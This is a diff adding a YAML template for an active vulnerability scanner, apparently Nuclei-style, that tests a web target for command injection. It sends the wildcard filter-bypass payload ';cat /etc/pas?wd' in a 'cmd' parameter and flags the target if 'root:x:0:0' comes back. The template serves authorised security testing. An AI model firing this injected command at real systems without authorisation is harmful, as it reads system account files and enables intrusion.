@@ -1,0 +1,20 @@
+id: patt-cmdi-wild-01-cmd
+name: 'PATT cmdi patt-cmdi-wild-01 via cmd'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - patt
+  - filterword
+description: 'PATT Bypass With Wildcards: ? covers blacklisted letters. [patt:patt-cmdi-wild-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      cmd:
+        - ';cat /etc/pas?wd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
